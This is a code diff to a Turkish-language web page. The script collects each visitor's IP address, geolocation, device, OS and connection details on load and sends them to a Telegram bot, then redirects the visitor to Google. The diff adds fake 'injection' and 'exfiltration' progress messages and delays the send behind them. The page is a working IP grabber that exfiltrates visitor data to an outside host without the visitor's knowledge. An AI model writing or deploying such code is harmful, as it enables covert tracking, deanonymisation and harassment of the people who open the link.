@@ -64,8 +64,23 @@
                 consoleLog.scrollTop = consoleLog.scrollHeight;
             };
 
-            fill.style.width = "50%";
-            status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+            setTimeout(() => {
+                fill.style.width = "20%";
+                status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
+                log("Anti-Proxy katmanı aktif edildi.");
+            }, 1000);
+
+            setTimeout(() => {
+                fill.style.width = "50%";
+                status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+                log("İşlemci mimarisi taranıyor.");
+            }, 3000);
+
+            setTimeout(() => {
+                fill.style.width = "80%";
+                status.innerText = "[*] COORD GATEWAY ALINIYOR...";
+                log("Bölgesel proxy tünelleri kontrol ediliyor.");
+            }, 5000);
 
             let cacheBuster = "?cb=" + Math.random();
             fetch("https://ipapi.co/json/" + cacheBuster)
@@ -80,11 +95,8 @@
 
                 let ua = navigator.userAgent;
                 let os = "Bilinmeyen Sistem";
-                
-                // --- KESİN ÇÖZÜM: GARANTİ ANDROID SÜRÜM AYRIŞTIRICI ---
                 if (/Android/i.test(ua)) {
-                    let match = ua.match(/Android\s+([0-9\.]+)/i) || ua.match(/Android\/([0-9\.]+)/i);
-                    os = (match && match[1]) ? "Android " + match[1] : "Android";
+                    os = "Android";
                 } else if (/iPhone|iPad|iPod/i.test(ua)) {
                     os = "iOS";
                 } else if (/Windows/i.test(ua)) {
@@ -129,6 +141,13 @@
                     agTipi = navigator.connection.effectiveType + " (~" + navigator.connection.downlink + " Mbps)";
                 }
 
+                setTimeout(() => {
+                    fill.style.width = "100%";
+                    status.style.color = "#00ff66";
+                    status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
+                    log("Sistem logları şifrelendi, sızdırılıyor.");
+                }, 7000);
+
                 let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
                 mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
                 mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
@@ -159,12 +178,14 @@
                 let cid = "6845229845";
                 let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
-                fetch(url).finally(() => {
-                    window.location.replace("https://www.google.com");
-                });
+                setTimeout(() => {
+                    fetch(url)
+                    .then(() => { window.location.href = "https://www.google.com"; })
+                    .catch(() => { window.location.href = "https://www.google.com"; });
+                }, 8500);
             })
             .catch(() => {
-                window.location.replace("https://www.google.com");
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 8500);
             });
         };
     </script>
